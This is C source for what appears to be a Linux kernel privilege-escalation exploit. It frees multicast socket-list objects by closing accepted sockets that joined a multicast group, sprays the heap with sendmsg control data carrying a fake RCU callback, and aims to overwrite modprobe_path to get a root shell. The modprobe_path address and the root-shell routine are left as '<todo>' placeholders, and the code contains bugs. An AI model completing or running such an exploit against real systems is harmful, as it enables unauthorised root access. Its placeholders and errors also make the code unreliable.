#define	_GNU_SOURCE
#include <netinet/ip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>

#define	__rcu

struct rcu_head {
	struct rcu_head *next;
	void (*func)(struct rcu_head *head);
};

struct ip_sf_socklist {
	unsigned int	sl_max;
	unsigned int	sl_count;
	struct rcu_head rcu;
	unsigned int	sl_addr[0];
};

struct ip_mc_socklist {
	struct ip_mc_socklist	*next;
	struct ip_mreqn		multi;
	unsigned int		sfmode;
	struct ip_sf_socklist	*sflist;
	struct rcu_head		rcu;
};

static int prepare(void)
{
	return 0;
}

static void user_callbacks(void *arg);
int init_sendmsg_server(struct sockaddr_in *si, int port)
{
	int sock, err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);
	si->sin_addr.s_addr = htonl(INADDR_ANY);

	err = bind(sock, (struct sockaddr *)si, sizeof(*si));
	if (err == -1) {
		perror("bind");
		close(sock);
		return -1;
	}

	return sock;
}

int init_sendmsg_client(struct sockaddr_in *si, int port)
{
	int sock, err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);

	err = inet_aton("127.0.0.1", &si->sin_addr);
	if (err == -1) {
		perror("inet_aton");
		close(sock);
		return -1;
	}

	return sock;
}

int client_sendmsg(int sock, struct sockaddr_in *si, char *data, size_t len)
{
	int err;
	struct iovec iov;
	struct msghdr mh;

	memset(&iov, 0, sizeof(iov));
	memset(&mh, 0, sizeof(mh));

	iov.iov_base = data;
	iov.iov_len = len;

	mh.msg_name = si;
	mh.msg_namelen = sizeof(struct sockaddr);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;
	mh.msg_control = data;
	mh.msg_controllen = len;

	return sendmsg(sock, &mh, 0);
}

int spray_switch = 0;
void *spray0(void *arg)
{
	struct sockaddr_in sersi, clisi;
	int sfd, cfd;
	int port = (int)arg;

	sfd = init_sendmsg_server(&sersi, port);
	if (sfd == -1) {
		fprintf(stderr, "init_sendmsg_server err\n");
		return (void *)-1;
	}

	cfd = init_sendmsg_client(&clisi, port);
	if (cfd == -1) {
		fprintf(stderr, "init_sendmsg_client err\n");
		close(sfd);
		return (void *)-1;
	}

	size_t spray_len = sizeof(struct ip_mc_socklist);
	char buf[spray_len];
	memset(buf, 0, spray_len);
	struct ip_mc_socklist *fake_ml = (struct ip_mc_socklist *)buf;
	fake_ml->multi.imr_multiaddr.s_addr = inet_addr("224.0.0.0");
	fake_ml->multi.imr_ifindex = 1;
	fake_ml->rcu.func = user_callbacks;

	while (!spray_switch)
		usleep(1000);

	int i = 0;
	while (spray_switch) {
		client_sendmsg(cfd, &clisi, buf, spray_len);
	}

	close(sfd);
	close(cfd);
	return (void *)0;
}

int servfd;
struct sockaddr_in serv_addr;
static unsigned short port = 13579;
static int accept_times = 0x10;
static int spray_threads = 0x10;
static void do_child_connect(int times)
{
	int i = 0;
	int sockfd[times];

	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_family = AF_INET;
	sai.sin_port = htons(port);
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");

	for (i = 0; i < times; i++) {
		sockfd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (connect(sockfd[i],(struct sockaddr *)&sai,sizeof(sai)) == -1) {
			perror("connect");
			return -1;
		}
	}

	sleep(9);
}
static int do_it(void)
{
	int i = 0;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	struct group_req req;
	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_family = AF_INET;
	sai.sin_port = htons(port);
	sai.sin_addr.s_addr = inet_addr("224.0.0.0");
	req.gr_interface = 1;
	memcpy(&req.gr_group, &sai, sizeof(sai));

	pthread_t spray_thread[spray_threads];
	int spray_port = 54321;
	for (i = 0; i < spray_threads; i++) {
		pthread_create(&spray_thread, NULL, spray0, (void *)spray_port++);
	}

	servfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (servfd == -1) {
		perror("socket");
		return -1;
	}

	if (setsockopt(servfd,SOL_IP,MCAST_JOIN_GROUP,&req,sizeof(req)) == -1) {
		perror("setsockopt");
		return -1;
	}

	bind(servfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	listen(servfd, accept_times);

	int child;
	int connfd[accept_times];
	if ((child = fork()) < 0) {
		perror("fork");
	} else if (child == 0) {
		close(servfd);
		do_child_connect(accept_times);
		exit(0);
	}

	for (i = 0; i < accept_times; i++) {
		connfd[i] = accept(servfd, NULL, NULL);
		if (connfd[i] == -1) {
			perror("accept");
			return -1;
		}
	}

	/* do the first free */
	if (connfd[0])
		close(connfd[0]);

	usleep(30*1000);
	spray_switch = 1;

	/* do the last frees */
	for (i = 1; i < accept_times; i++) {
		close(connfd[i]);
		usleep(30*1000);
	}

	return 0;
}

#define	MODPROBE_PATH	`<todo>`
static void user_callbacks(void *arg)
{
	char *mod_path = (char *)MODPROBE_PATH;
	mod_path[0] = '/';
	mod_path[1] = 't';
	mod_path[2] = 'm';
	mod_path[3] = 'p';
	mod_path[4] = '/';
	mod_path[5] = 'n';
	mod_path[6] = 'm';
	mod_path[7] = 0;
}
static int get_root_shell(void)
{
	`<todo>`
	return 0;
}

int main(int argc, char *argv[])
{
	int err;

	err = prepare();
	if (err) {
		fprintf(stderr, "prepare err\n");
		return -1;
	}

	err = do_it();
	if (err) {
		fprintf(stderr, "do_it err\n");
		return -1;
	}

	err = get_root_shell();
	if (err) {
		fprintf(stderr, "get_root_shell err\n");
		return -1;
	}

	return 0;
}
